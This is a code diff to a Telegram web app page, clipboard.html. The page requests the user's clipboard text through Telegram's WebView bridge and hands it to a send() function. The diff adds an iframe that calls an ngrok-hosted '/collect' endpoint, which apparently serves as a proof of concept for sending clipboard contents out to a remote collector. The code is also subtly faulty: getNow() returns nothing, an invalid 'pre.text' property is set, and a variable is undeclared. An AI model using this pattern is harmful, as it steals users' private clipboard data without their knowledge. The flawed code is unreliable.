@@ -5,20 +5,19 @@
     </head>
     <body>
         <h1>clipboard.html</h1>
-        <iframe id="sender" src="about:blank" style="height:0;width:0;border:0;border:none;visibility:hidden;"></iframe>
-        <a href="javascript:tryReadClipboard()">Try read clipboard</a>
-        <a href="javascript:send()">Try send data</a>
+        <pre id="debug"></pre>
+        <br/><br/>
+        <iframe src="https://4220-121-190-139-95.ngrok-free.app/collect?data=test"></iframe>
         <script>
             window.Telegram.WebView.onEvent('clipboard_text_received', (_type, _json) => {
-                let pre = document.createElement('pre');
-                let txt = ''
+                let pre = document.getElementById('debug')
+                let now = getNow()
                 if (_json['data'] === undefined) {
+                    pre.text = 'data is null' + ' (' + now + ')';
                     txt = document.createTextNode('data is null');
                 } else {
-                    txt = document.createTextNode(_json['data']);
+                    pre.text = _json['data'] + ' (' + now + ')';
                 }
-                pre.appendChild(txt);
-                document.body.append(pre);    
 
                 if (_json['data'] !== undefined) {
                     send(_json['data']);
@@ -37,6 +36,14 @@
                 window.TelegramWebviewProxy.postEvent('web_app_read_text_from_clipboard', JSON.stringify({
                     'req_id': 'xxxxxxxxxxxxxxxx'
                 }));
+            }
+
+            function getNow() {
+                let today = new Date();   
+                return 
+                    today.getHours() + ':' +
+                    today.getMinutes() + ':' +
+                    today.getSeconds();
             }
         </script>
     </body>
